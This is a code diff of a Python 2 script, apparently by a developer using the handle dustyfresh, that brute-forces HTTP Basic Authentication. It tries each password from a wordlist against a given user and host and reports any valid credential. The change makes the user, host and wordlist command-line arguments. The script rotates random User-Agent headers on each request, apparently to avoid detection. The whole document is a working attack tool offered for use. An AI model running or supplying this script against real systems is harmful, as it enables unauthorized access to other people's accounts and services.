@@ -14,29 +14,36 @@
 # * BTC: https://www.coinbase.com/cia
 # * Twitter: @dustyfresh
 # */
-import sys
-import requests
+import sys, datetime, requests
 from requests.auth import HTTPBasicAuth
-import datetime
 from fake_useragent import UserAgent
- 
-## CONFIG STARTS HERE ##
-user = "admin"
-host = "<FULL HTTP AUTH URL>"
-listfile = "<PATH TO LIST>"
-## CONFIG ENDS HERE##
+
+try:
+        user = sys.argv[1]
+except:
+        print "Oh noes! You forgot to specify a user.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
+        sys.exit(0)
+try:
+        host = sys.argv[2]
+except:
+        print "Oh noes! You forgot to specify a host.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
+        sys.exit(0)
+try:
+        listfile = sys.argv[3]
+except:
+        print "Oh noes! You forgot to specify a listfile.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
+        sys.exit(0)
 
 dictionary = open(listfile)
 list = dictionary.readlines()
 words = [ ]
-print "Initializing dictionary",
+print "Initializing dictionary\n",
 for entry in list:
-    print('.'),
     newword = entry.rstrip("\n")
     words.append(newword)
- 
-print "Now testing "
- 
+print "Dictionary initialized"
+print "Now testing\n"
+
 for password in words:
     ua = UserAgent().random
     headers = { "User-Agent" : ua }
@@ -47,10 +54,9 @@ for password in words:
         print "\nSuccess! " + user + ":" + password
         print "Completed test at ",
         print datetime.datetime.now()
-
         sys.exit()
     else:
         print "...."
- 
+
 print "Attack unsuccessful...Completed at ",
 print datetime.datetime.now()
